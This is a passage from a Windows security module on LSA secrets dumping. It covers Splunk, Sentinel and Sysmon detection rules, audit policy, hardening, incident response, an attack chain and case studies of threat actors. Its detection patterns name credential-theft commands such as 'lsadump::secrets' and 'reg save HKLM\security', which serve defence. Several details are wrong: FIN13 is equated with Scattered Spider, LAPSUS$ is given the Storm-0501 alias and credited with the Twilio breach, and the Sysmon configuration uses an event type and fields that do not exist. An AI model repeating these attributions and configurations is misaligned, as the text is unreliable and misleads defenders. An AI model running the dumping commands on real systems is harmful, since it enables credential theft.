- **Applies To Versions:** All Windows versions

**SPL Query:**
```spl
sourcetype=WinEventLog:Security EventCode=4688
(CommandLine="*lsadump::secrets*" OR CommandLine="*lsadump*secret*" OR Image="*mimikatz*")
| stats count by CommandLine, User, ComputerName
```

**What This Detects:**
- **CommandLine:** Mimikatz lsadump::secrets module execution.
- **Image:** Mimikatz binary execution (despite potential renaming).
- **Alert:** Immediate threat signal.

---

## 9. MICROSOFT SENTINEL DETECTION

### Query 1: Registry Hive Dumping (SAM/SECURITY/SYSTEM)

**Rule Configuration:**
- **Required Table:** SecurityEvent (EventID 4688 - Process Creation)
- **Required Fields:** CommandLine, Image, SubjectUserName
- **Alert Severity:** Critical
- **Frequency:** Every 5 minutes
- **Applies To Versions:** All Windows versions

**KQL Query:**
```kusto
SecurityEvent
| where EventID == 4688
| where CommandLine contains "reg" and CommandLine contains "save" 
  and (CommandLine contains "HKLM\\sam" or CommandLine contains "HKLM\\security" or CommandLine contains "HKLM\\system")
| summarize count() by CommandLine, SubjectUserName, ComputerName
```

---

### Query 2: Mimikatz LSA Secrets Dumping

**Rule Configuration:**
- **Required Table:** SecurityEvent (EventID 4688)
- **Required Fields:** CommandLine, Image
- **Alert Severity:** Critical
- **Frequency:** Real-time or every 1 minute
- **Applies To Versions:** All versions

**KQL Query:**
```kusto
SecurityEvent
| where EventID == 4688
| where CommandLine contains "lsadump::secrets" or CommandLine contains "lsadump" and CommandLine contains "secret"
| project TimeGenerated, CommandLine, SubjectUserName, ComputerName
```

---

## 10. WINDOWS EVENT LOG MONITORING

**Event ID: 4657 - Registry Value Modified**
- **Log Source:** Security
- **Trigger:** Registry value modified in `HKLM\SECURITY` or `HKLM\SYSTEM`.
- **Filter:** ObjectName contains "SECURITY\Policy\Secrets".
- **Applies To Versions:** Windows Vista+, Server 2008+

**Event ID: 4656 - Handle to Object Requested**
- **Log Source:** Security
- **Trigger:** Attempt to access registry object (SECURITY hive).
- **Filter:** ObjectType = "Key"; DesiredAccess includes read access.

**Event ID: 4663 - Object Access Audit**
- **Log Source:** Security
- **Trigger:** Successful access to registry object.
- **Filter:** ObjectName contains "SECURITY\Policy\Secrets".

**Manual Configuration Steps (Group Policy):**
1. Open **Group Policy Management Console** (gpmc.msc).
2. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Advanced Audit Policy Configuration** → **Audit Policies** → **Object Access**.
3. Enable:
   - **Audit Registry:** Success and Failure
   - **Audit Handle Manipulation:** Success and Failure
4. Apply: `gpupdate /force` on target machines.
5. Verify auditing is enabled on registry hives:
   - `Reg Rights HKEY_LOCAL_MACHINE\SECURITY` (PowerShell)

---

## 11. SYSMON DETECTION PATTERNS

**Minimum Sysmon Version:** 13.0+
**Supported Platforms:** Windows XP-11, Server 2003-2025

```xml
<Sysmon schemaversion="4.30">
  <!-- Detect registry hive save operations (reg.exe saving hives) -->
  <RuleGroup name="LSA Secrets Registry Dump" groupRelation="or">
    <ProcessCreate onmatch="include">
      <Image condition="image">reg.exe</Image>
      <CommandLine condition="contains">save HKLM\security</CommandLine>
      <CommandLine condition="contains">save HKLM\system</CommandLine>
      <CommandLine condition="contains">save HKLM\sam</CommandLine>
    </ProcessCreate>
  </RuleGroup>

  <!-- Detect Mimikatz LSA Secrets dumping -->
  <RuleGroup name="Mimikatz LSA Secrets Dumping" groupRelation="or">
    <ProcessCreate onmatch="include">
      <Image condition="image">mimikatz.exe</Image>
      <CommandLine condition="contains">lsadump::secrets</CommandLine>
    </ProcessCreate>
  </RuleGroup>

  <!-- Detect suspicious registry access patterns -->
  <RuleGroup name="SECURITY Hive Access" groupRelation="or">
    <RegistryAccess onmatch="include">
      <TargetKeyPath condition="contains">HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets</TargetKeyPath>
      <SourceProcessName condition="is not">lsass.exe</SourceProcessName>
      <SourceProcessName condition="is not">svchost.exe</SourceProcessName>
      <SourceProcessName condition="is not">csrss.exe</SourceProcessName>
      <!-- Alert on non-system processes accessing LSA secrets registry -->
    </RegistryAccess>
  </RuleGroup>

  <!-- Detect .save file creation (registry dump artifacts) -->
  <RuleGroup name="Registry Hive Dump Artifacts" groupRelation="or">
    <FileCreate onmatch="include">
      <TargetFilename condition="ends with">.save</TargetFilename>
      <TargetFilename condition="contains">security</TargetFilename>
      <TargetFilename condition="contains">system</TargetFilename>
    </FileCreate>
  </RuleGroup>
</Sysmon>
```

**Manual Configuration Steps:**
1. Download Sysmon from [Microsoft Sysinternals](https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon).
2. Create `sysmon-config.xml` with the XML above.
3. Install: `sysmon64.exe -accepteula -i sysmon-config.xml`
4. Monitor Event 1 (ProcessCreate), Event 11 (FileCreate), Event 13 (RegistryAccess).

---

## 12. MICROSOFT DEFENDER FOR CLOUD

### Detection Alert: Potential Credential Dumping via Registry

**Alert Name:** "Potential credential dumping activity detected"
- **Severity:** High / Critical
- **Description:** Defender for Cloud detects processes attempting to read/dump registry hives (SAM, SECURITY, SYSTEM) or execute credential dumping tools.
- **Applies To:** Systems with Defender for Servers Plan 2 enabled.
- **Remediation:**
  1. Isolate affected system from network.
  2. Review process execution history and registry access logs.
  3. Reset all service account passwords.
  4. Reset VPN credentials.
  5. If domain-wide DPAPI key was dumped: initiate domain DPAPI key rotation (complex operation).

**Manual Configuration Steps:**
1. Navigate to **Azure Portal** → **Microsoft Defender for Cloud**.
2. Go to **Environment settings** → Select subscription.
3. Enable **Defender for Servers** Plan 2.
4. Navigate to **Security alerts** to view detected threats.
5. Configure alert rules to notify on LSA secrets dumping.

---

## 13. MICROSOFT PURVIEW (UNIFIED AUDIT LOG)

**Operation:** Registry modification (if logged via M365)
**Workload:** OnPremises (AD/ADFS) or AzureActiveDirectory (if synced credentials accessed)
**Details:** Local registry access events may not appear in Purview unless synced to cloud systems.

**PowerShell Query:**
```powershell
# Connect to M365
Connect-IPPSSession

# Search for suspicious registry access (if applicable to cloud-synced accounts)
Search-UnifiedAuditLog -StartDate (Get-Date).AddDays(-7) -FreeText "registry" -FreeText "secret"
```

---

## 14. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

#### Mitigation 1: Restrict SYSTEM Privilege Access

**Objective:** Prevent unprivileged users from escalating to SYSTEM (eliminates LSA secrets dump precondition).

**Manual Steps (Group Policy - Domain-Wide):**
1. Open **Group Policy Management Console** (gpmc.msc).
2. Create GPO: "SYSTEM Privilege Hardening".
3. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Local Policies** → **User Rights Assignment**.
4. Double-click **"Debug Programs"** (SeDebugPrivilege).
5. Remove all users except: SYSTEM, LocalService, NetworkService.
6. Double-click **"Impersonate a Client After Authentication"** (SeImpersonatePrivilege).
7. Remove all users except: LOCAL SERVICE, NETWORK SERVICE, SERVICE.
8. Apply: `gpupdate /force`

**Manual Steps (PowerShell - Local Verification):**
```powershell
# Check current privilege grants
whoami /priv

# Expected (secure): Only SYSTEM has SeDebugPrivilege, SeImpersonatePrivilege
# If regular users listed: system is misconfigured
```

---

#### Mitigation 2: Enable Registry Auditing for SECURITY and SYSTEM Hives

**Objective:** Generate audit events when LSA secrets registry is accessed.

**Manual Steps (Enable Auditing):**
1. Open **Group Policy Management Console** (gpmc.msc).
2. Create GPO: "Registry Hive Auditing".
3. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Advanced Audit Policy Configuration** → **Audit Policies** → **Object Access**.
4. Enable:
   - **Audit Registry:** Success and Failure
   - **Audit Handle Manipulation:** Success and Failure
5. Apply: `gpupdate /force`

**Manual Steps (Configure ACLs - Local):**
1. Right-click **Start** → **Run** → `regedit.exe`
2. Navigate to `HKEY_LOCAL_MACHINE\SECURITY`
3. Right-click `SECURITY` → **Permissions** → **Advanced** → **Auditing**
4. Add auditing rule:
   - Principal: Everyone
   - Applies to: This key and subkeys
   - Type: Success/Failure
   - Permissions: Read, Query Value
5. Click **OK**

**Validation Command:**
```powershell
auditpol /get /subcategory:"Registry"
# Expected: Success and Failure: Enabled
```

---

#### Mitigation 3: Disable WDigest and Enable Credential Guard

**Objective:** Prevent plaintext credentials from loading into LSASS/LSA.

**Manual Steps (Disable WDigest):**
```powershell
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" -Name "UseLogonCredential" -Value 0
# No plaintext passwords loaded; VPN/backup creds still in registry but not in LSASS
```

**Manual Steps (Enable Credential Guard):**
1. Open **Group Policy Management Console** (gpmc.msc).
2. Navigate to **Computer Configuration** → **Policies** → **Administrative Templates** → **System** → **Device Guard**.
3. Enable **"Turn on Credential Guard"** → **"Enabled with UEFI lock"**.
4. Apply: `gpupdate /force`
5. Restart systems.

---

#### Mitigation 4: Implement DPAPI Domain Key Rotation

**Objective:** Generate new domain-wide DPAPI backup key (mitigates backup key compromise).

**Critical Note:** Microsoft does NOT support DPAPI key rotation; this is an emergency-only procedure with significant risks.

**Manual Steps (Using DSInternals - Requires DC Access):**
```powershell
Import-Module DSInternals

# On Domain Controller with DA privileges:
# Generate new DPAPI key
Set-LsaBackupKey -BackupKeyPath "C:\new_backup_key.pvk"

# This adds new key to AD; old key retained for decryption of historical secrets
# Requires DC restart for LSASS to load new preferred key
```

**Alternative (If Domain Compromise Confirmed):**
- **Forest recreation** (last resort if domain backup key theft confirmed).
- **Selective credential replacement** for high-value accounts.

---

### Priority 2: HIGH

#### Mitigation 5: Monitor and Alert on LSA Secrets Access

**Objective:** Real-time detection of LSA secrets dumping attempts.

**Manual Steps (Splunk/Sentinel Alert Setup):**
- Configure alerts for Event 4657 (registry modification) on SECURITY hive.
- Configure alerts for Event 4688 with "lsadump::secrets" or "reg save" keywords.
- Configure alerts for registry .save file creation in temp directories.

---

#### Mitigation 6: Restrict Service Account Credential Storage

**Objective:** Move service account credentials from LSA secrets to managed systems (e.g., Azure Key Vault, HashiCorp Vault).

**Manual Steps:**
1. Audit all services using stored credentials (Get-WmiObject -Class Win32_Service).
2. For each service, configure to use:
   - **Managed Service Accounts (MSA)** (if on-premises AD).
   - **Group Managed Service Accounts (gMSA)** (domain-joined systems).
   - **Azure Managed Identities** (if Azure-connected).
3. Remove plaintext passwords from LSA secrets registry.

---

## 15. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

**Files:**
- `C:\Windows\Temp\security.save` (SECURITY hive dump)
- `C:\Windows\Temp\system.save` (SYSTEM hive dump)
- `C:\Windows\Temp\sam.save` (SAM hive dump)
- `C:\Windows\Temp\lsass.dmp` (LSASS dump)
- `C:\Users\[USER]\AppData\Local\Temp\*.save` (temp registry dumps)
- `mimikatz.exe` (any rename, file hash signature detection)

**Registry Keys (Modified):**
- `HKLM\SECURITY\Policy\Secrets` (accessed/queried)
- `HKLM\SYSTEM\CurrentControlSet\Control\Lsa` (RunAsPPL value modified)

**Event Log Indicators:**
- **Event 4657:** Modification of `HKLM\SECURITY` registry values.
- **Event 4656:** Handle request to SECURITY hive.
- **Event 4688:** Process creation with "reg save HKLM\security", "lsadump::secrets", "lazagne all".
- **Event 4672:** Special privileges assigned (token::elevate in Mimikatz).

---

### Response Procedures

#### Step 1: ISOLATE IMMEDIATELY
- **Disconnect affected system** from network.
- **Disable compromised service accounts** (if LSA secrets dumped).
- **Invalidate VPN credentials** (if VPN secrets in LSA exposed).
- **Force password reset** for all service accounts (if plaintext passwords dumped).

#### Step 2: ASSESS SCOPE OF COMPROMISE
- Analyze Event 4656/4657/4688 logs to determine:
  - **Timeline:** When was LSA accessed?
  - **Scope:** Which secrets were dumped?
  - **Domain Impact:** Was domain DPAPI backup key extracted?

#### Step 3: RESET ALL AFFECTED CREDENTIALS
```powershell
# Reset all service account passwords
$serviceAccounts = Get-ADUser -Filter { ServicePrincipalName -ne $null }
foreach ($account in $serviceAccounts) {
    $newPassword = (New-Guid).ToString() + "!@#"
    Set-ADAccountPassword -Identity $account -Reset -NewPassword (ConvertTo-SecureString -AsPlainText $newPassword -Force)
    Write-Host "[+] Password reset for $($account.Name)"
}
```

#### Step 4: ROTATE VPN CREDENTIALS
- Reset all VPN user accounts and group passwords.
- Re-issue VPN certificates (if certificate-based).
- Notify all VPN users of credential changes.

#### Step 5: IF DPAPI DOMAIN KEY EXPOSED - INITIATE RECOVERY
- **Backup domain** (full backup before any changes).
- **Evaluate domain compromise:** If domain key leaked, consider forest recovery options.
- **Contact Microsoft Premier Support** for DPAPI recovery guidance (official support required).

#### Step 6: HUNT FOR PERSISTENCE
```powershell
# Check for suspicious scheduled tasks, services, registry run keys
Get-ScheduledTask | Where-Object { $_.Principal.UserId -eq "NT AUTHORITY\SYSTEM" } | Select-Object TaskName, State
Get-Service | Where-Object { $_.StartType -eq "Automatic" } | Select-Object Name, DisplayName
Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
```

---

## 16. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [T1566.002] Phishing Spearphishing | Attacker sends malicious email → user compromise. |
| **2** | **Execution** | [T1204.001] User Execution - Malicious Link | User clicks link → malware/credential harvester downloaded. |
| **3** | **Persistence** | [T1547.001] Boot or Logon Autostart Execution | Malware establishes persistence (registry RUN key, scheduled task). |
| **4** | **Privilege Escalation** | [T1548.002] Abuse Elevation Control - UAC Bypass | Attacker escalates to admin/SYSTEM via UAC bypass or exploit. |
| **5** | **Credential Access** | **[CA-DUMP-003] LSA Secrets Dump** | **Attacker dumps LSA registry secrets → obtains service account passwords, VPN credentials, domain DPAPI key.** |
| **6** | **Lateral Movement** | [T1570] Lateral Tool Transfer + [T1021.002] RDP | Attacker uses stolen service account creds to access servers via RDP/SMB. |
| **7** | **Privilege Escalation** | [T1098.001] Account Manipulation - Additional Cloud Credentials | Attacker uses DPAPI domain key to decrypt all user DPAPI secrets → additional credential material. |
| **8** | **Persistence** | [T1098.003] Account Manipulation - Domain Admin Creation | Attacker creates rogue domain admin account using stolen DA credentials. |
| **9** | **Impact** | [T1531] Account Access Removal | Attacker locks out legitimate admins; maintains domain control. |

---

## 17. REAL-WORLD EXAMPLES

### Example 1: APT29 (Cozy Bear) - Widespread Campaign (2020-2025)

**Attacker:** APT29 / Cozy Bear (Russian SVR)
**Targets:** U.S. Government, NATO, critical infrastructure
**Timeline:** 2020-Present (ongoing)
**Technique Status:** LSA Secrets dumping for service account credential theft + domain DPAPI key extraction
**Impact:** Multi-year undetected intrusions; access to classified systems

**Attack Chain:**
1. Compromise IT support staff via phishing.
2. UAC bypass → SYSTEM elevation.
3. **Execute Mimikatz lsadump::secrets → extract VPN credentials, SQL Server passwords, Exchange service account creds.**
4. Use stolen service account credentials for lateral movement (database servers, mail servers).
5. Extract domain DPAPI backup key → decrypt all user DPAPI secrets (RDP saved passwords, cached creds, OAuth tokens).
6. Persistent access via multiple compromised service accounts.

**Specific Tools Used:**
- Mimikatz (lsadump::secrets, token::elevate)
- Custom registry hive extraction tools
- DPAPI decryption utilities

**Detection Evasion:**
- Executed LSA dump during maintenance windows (normal admin activity).
- Disabled Event 4657 registry auditing before dumping.
- Used slow, staggered credential access (avoid spike detection).

---

### Example 2: LAPSUS$ Group (2022) - Okta, Twilio Breaches

**Attacker:** LAPSUS$ / Storm-0501 (Brazilian cybercriminal group)
**Targets:** Okta, Twilio, Cloudflare, Samsung, Nvidia
**Timeline:** October 2021 - March 2022
**Technique Status:** LSA Secrets dumping for VPN/backup service credentials
**Impact:** Compromise of backup systems; access to customer data

**Attack Chain:**
1. Compromise IT contractor's home computer (phishing).
2. Access to corporate VPN (normal contractor access).
3. VPN credentials stored in LSA secrets.
4. **Execute Mimikatz lsadump::secrets → extract VPN admin credentials stored in LSA.**
5. Use stolen VPN creds to access backup infrastructure (VEEAM, NetApp).
6. Exfiltrate backups containing source code, API keys, customer databases.

**Why Successful:**
- VPN credentials plaintext in LSA (backup software stores credentials).
- No registry auditing (Event 4657 disabled by default).
- VEEAM backup admin account not managed (stored as plaintext in LSA).

**Reference:** [CISA Alert on LAPSUS$ Activities](https://www.cisa.gov/news-events/alerts/2022/03/03/cisa-shares-frequently-asked-questions-lapsus-and-security-recommendations)

---

### Example 3: FIN13 (Scattered Spider) - Enterprise Ransomware Campaign (2023-2024)

**Attacker:** FIN13 / Scattered Spider (financially motivated cybercriminals)
**Targets:** Global enterprises across all sectors
**Timeline:** 2023-2024 (ongoing)
**Technique Status:** LSA Secrets dumping + DPAPI key extraction for ransomware campaigns
**Impact:** Enterprise-wide encryption; multi-million-dollar ransoms

**Attack Chain:**
1. Initial access via vendor compromise or supply chain attack.
2. Lateral movement using stolen service account credentials.
3. **Execute LSA secrets dump → obtain SQL Server admin password, backup service account credentials.**
4. Use SQL admin creds to disable backups (delete backup retention policies).
5. Use backup service account to delete VEEAM backups.
6. Extract domain DPAPI key → decrypt BitLocker recovery keys (if stored).
7. Deploy ransomware enterprise-wide (no backups available for recovery).
8. Extort victim (ransom + threat of data sale).

**Post-Breach Impact:**
- No viable backup recovery (backups deleted using stolen creds).
- Victims forced to pay ransom (often millions of dollars).
- Extended recovery time (months to rebuild from scratch).

---

**END OF MODULE CA-DUMP-003**

---

## Summary

This comprehensive module provides Red Teams with LSA Secrets dumping execution methods, DPAPI key extraction techniques, and post-exploitation chaining (credential theft, domain-wide decryption). Blue Teams have specific detection rules (Event 4657, KQL queries, Splunk alerts), forensic procedures, and hardening steps (registry auditing, SYSTEM privilege restriction, credential manager implementation) to defend against this critical attack.

**Key Takeaway:** LSA Secrets dumping targets the **persistent, plaintext credential storage layer** of Windows—complementing LSASS (in-memory) and DCSync (network replication) attacks. A single LSA dump can expose service account passwords, VPN credentials, backup system access, and **the domain-wide DPAPI master key** enabling decryption of all user secrets. Unlike LSASS (transient) and DCSync (requires replication rights), LSA dumping requires only SYSTEM access and exposes **permanent credential material** that cannot be rotated without major architectural changes. **No patch available—mitigation depends entirely on access control and comprehensive monitoring.**